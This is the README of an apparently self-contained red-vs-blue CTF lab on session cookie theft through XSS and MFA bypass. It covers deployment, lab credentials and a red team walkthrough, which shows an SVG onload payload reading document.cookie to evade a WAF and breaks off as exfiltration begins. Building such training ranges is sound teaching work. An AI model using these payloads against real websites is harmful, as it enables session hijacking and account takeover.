# CTF Lab — Scenario 75: Cookies Reuse & MFA Bypass

A self-contained Red vs. Blue cyber range lab simulating a session cookie theft attack via XSS and MFA bypass.

## Requirements

- Docker & Docker Compose
- Linux VM (tested on Ubuntu 22.04)

## Deployment

```bash
# 1. Clone the repository
git clone <your-repo-url>
cd ctf-lab-scenario75

# 2. Run setup (creates log directory and injects simulated attack logs)
bash scripts/setup.sh

# 3. Start the lab
docker compose up --build -d
```

## Access Points

| Service | Address | Credentials |
|---|---|---|
| Web App | http://localhost:3075 | — |
| SSH (Blue Team) | ssh analyst@localhost -p 2275 | analyst / blue_team_rocks |
| Logs | /opt/admin/logs/ | — |

## Red Team Walkthrough

### Phase 1 — Reconnaissance
1. Visit `http://localhost:3075` — check response headers for `X-Powered-By: Node.js`
2. Visit `/robots.txt` — reveals disallowed path `/api/verify-mfa`
3. View page source — ASCII art hints to check `robots.txt`
4. Observe cookie `pre_mfa_session=pending_mfa_verification` (HttpOnly=false)

### Phase 2 — WAF Bypass & XSS
1. POST to `/api/feedback` with `<script>alert(1)</script>` — returns 403
2. Bypass using SVG: `<svg onload="alert(document.cookie)">`
3. To exfiltrate cookie, use bracket notation to bypass WAF keyword filter:
